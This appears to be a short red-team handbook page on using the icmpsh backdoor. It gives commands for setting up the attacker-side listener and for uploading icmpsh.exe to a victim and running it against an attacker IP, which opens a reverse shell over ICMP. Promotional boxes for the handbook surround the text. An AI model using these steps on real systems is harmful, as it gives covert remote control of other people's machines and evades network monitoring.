

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.khulnasoft.com/courses/arte"><strong>htARTE (ByteBreach AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support ByteBreach:

* If you want to see your **company advertised in ByteBreach** or **download ByteBreach in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/khulnasoft)!
* Get the [**official PEASS & ByteBreach swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@bytebreach_live**](https://twitter.com/bytebreach_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**ByteBreach**](https://github.com/khulnasoft/bytebreach) and [**ByteBreach Cloud**](https://github.com/khulnasoft/bytebreach-cloud) github repos.

</details>


Download the backdoor from: [https://github.com/inquisb/icmpsh](https://github.com/inquisb/icmpsh)

# Client side

Execute the script: **run.sh**

**If you get some error, try to change the lines:**

```bash
IPINT=$(ifconfig | grep "eth" | cut -d " " -f 1 | head -1)
IP=$(ifconfig "$IPINT" |grep "inet addr:" |cut -d ":" -f 2 |awk '{ print $1 }')
```

**For:**

```bash
echo Please insert the IP where you want to listen
read IP
```

# **Victim Side**

Upload **icmpsh.exe** to the victim and execute:

```bash
icmpsh.exe -t <Attacker-IP> -d 500 -b 30 -s 128
```



<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.khulnasoft.com/courses/arte"><strong>htARTE (ByteBreach AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support ByteBreach:

* If you want to see your **company advertised in ByteBreach** or **download ByteBreach in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/khulnasoft)!
* Get the [**official PEASS & ByteBreach swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@bytebreach_live**](https://twitter.com/bytebreach_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**ByteBreach**](https://github.com/khulnasoft/bytebreach) and [**ByteBreach Cloud**](https://github.com/khulnasoft/bytebreach-cloud) github repos.

</details>


